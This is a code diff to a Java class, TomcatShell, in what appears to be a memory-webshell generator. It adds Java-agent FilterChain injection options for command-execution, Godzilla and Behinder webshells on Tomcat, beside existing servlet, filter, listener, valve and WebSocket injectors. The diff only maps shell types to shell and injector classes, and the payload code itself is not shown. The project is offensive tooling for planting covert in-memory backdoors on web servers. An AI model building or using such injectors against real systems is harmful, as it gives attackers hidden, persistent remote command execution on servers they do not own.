@@ -10,9 +10,12 @@ import com.reajason.javaweb.memshell.shelltool.godzilla.GodzillaFilter;
 import com.reajason.javaweb.memshell.shelltool.godzilla.GodzillaServlet;
 import com.reajason.javaweb.memshell.shelltool.godzilla.GodzillaValve;
 import com.reajason.javaweb.memshell.tomcat.behinder.BehinderListener;
+import com.reajason.javaweb.memshell.tomcat.behinder.TomcatFilterChainBehinderAdvisor;
 import com.reajason.javaweb.memshell.tomcat.command.CommandListener;
 import com.reajason.javaweb.memshell.tomcat.command.CommandWebSocket;
+import com.reajason.javaweb.memshell.tomcat.command.TomcatFilterChainCommandAdvisor;
 import com.reajason.javaweb.memshell.tomcat.godzilla.GodzillaListener;
+import com.reajason.javaweb.memshell.tomcat.godzilla.TomcatFilterChainGodzillaAdvisor;
 import com.reajason.javaweb.memshell.tomcat.injector.*;
 import org.apache.commons.lang3.tuple.Pair;
 
@@ -28,19 +31,23 @@ public class TomcatShell extends AbstractShell {
     public static final String WEBSOCKET = "WebSocket";
     public static final String UPGRADE = "Upgrade";
     public static final String EXECUTOR = "Executor";
+    public static final String AGENT_FILTER_CHAIN = AGENT + "FilterChain";
+    public static final String AGENT_JAKARTA_FILTER_CHAIN = AGENT + "JakartaFilterChain";
 
     @Override
     protected Map<String, Pair<Class<?>, Class<?>>> getCommandShellMap() {
-        return Map.of(
-                SERVLET, Pair.of(CommandServlet.class, TomcatServletInjector.class),
-                JAKARTA_SERVLET, Pair.of(CommandServlet.class, TomcatServletInjector.class),
-                FILTER, Pair.of(CommandFilter.class, TomcatFilterInjector.class),
-                JAKARTA_FILTER, Pair.of(CommandFilter.class, TomcatFilterInjector.class),
-                LISTENER, Pair.of(CommandListener.class, TomcatListenerInjector.class),
-                JAKARTA_LISTENER, Pair.of(CommandListener.class, TomcatListenerInjector.class),
-                VALVE, Pair.of(CommandValve.class, TomcatValveInjector.class),
-                JAKARTA_VALVE, Pair.of(CommandValve.class, TomcatValveInjector.class),
-                WEBSOCKET, Pair.of(CommandWebSocket.class, TomcatWebSocketInjector.class)
+        return Map.ofEntries(
+                Map.entry(SERVLET, Pair.of(CommandServlet.class, TomcatServletInjector.class)),
+                Map.entry(JAKARTA_SERVLET, Pair.of(CommandServlet.class, TomcatServletInjector.class)),
+                Map.entry(FILTER, Pair.of(CommandFilter.class, TomcatFilterInjector.class)),
+                Map.entry(JAKARTA_FILTER, Pair.of(CommandFilter.class, TomcatFilterInjector.class)),
+                Map.entry(LISTENER, Pair.of(CommandListener.class, TomcatListenerInjector.class)),
+                Map.entry(JAKARTA_LISTENER, Pair.of(CommandListener.class, TomcatListenerInjector.class)),
+                Map.entry(VALVE, Pair.of(CommandValve.class, TomcatValveInjector.class)),
+                Map.entry(JAKARTA_VALVE, Pair.of(CommandValve.class, TomcatValveInjector.class)),
+                Map.entry(AGENT_FILTER_CHAIN, Pair.of(TomcatFilterChainCommandAdvisor.class, TomcatFilterChainAgentInjector.class)),
+                Map.entry(AGENT_JAKARTA_FILTER_CHAIN, Pair.of(TomcatFilterChainCommandAdvisor.class, TomcatFilterChainAgentInjector.class)),
+                Map.entry(WEBSOCKET, Pair.of(CommandWebSocket.class, TomcatWebSocketInjector.class))
         );
     }
 
@@ -54,7 +61,9 @@ public class TomcatShell extends AbstractShell {
                 LISTENER, Pair.of(GodzillaListener.class, TomcatListenerInjector.class),
                 JAKARTA_LISTENER, Pair.of(GodzillaListener.class, TomcatListenerInjector.class),
                 VALVE, Pair.of(GodzillaValve.class, TomcatValveInjector.class),
-                JAKARTA_VALVE, Pair.of(GodzillaValve.class, TomcatValveInjector.class)
+                JAKARTA_VALVE, Pair.of(GodzillaValve.class, TomcatValveInjector.class),
+                AGENT_FILTER_CHAIN, Pair.of(TomcatFilterChainGodzillaAdvisor.class, TomcatFilterChainAgentInjector.class),
+                AGENT_JAKARTA_FILTER_CHAIN, Pair.of(TomcatFilterChainGodzillaAdvisor.class, TomcatFilterChainAgentInjector.class)
         );
     }
 
@@ -68,7 +77,9 @@ public class TomcatShell extends AbstractShell {
                 LISTENER, Pair.of(BehinderListener.class, TomcatListenerInjector.class),
                 JAKARTA_LISTENER, Pair.of(BehinderListener.class, TomcatListenerInjector.class),
                 VALVE, Pair.of(BehinderValve.class, TomcatValveInjector.class),
-                JAKARTA_VALVE, Pair.of(BehinderValve.class, TomcatValveInjector.class)
+                JAKARTA_VALVE, Pair.of(BehinderValve.class, TomcatValveInjector.class),
+                AGENT_FILTER_CHAIN, Pair.of(TomcatFilterChainBehinderAdvisor.class, TomcatFilterChainAgentInjector.class),
+                AGENT_JAKARTA_FILTER_CHAIN, Pair.of(TomcatFilterChainBehinderAdvisor.class, TomcatFilterChainAgentInjector.class)
         );
     }
 }
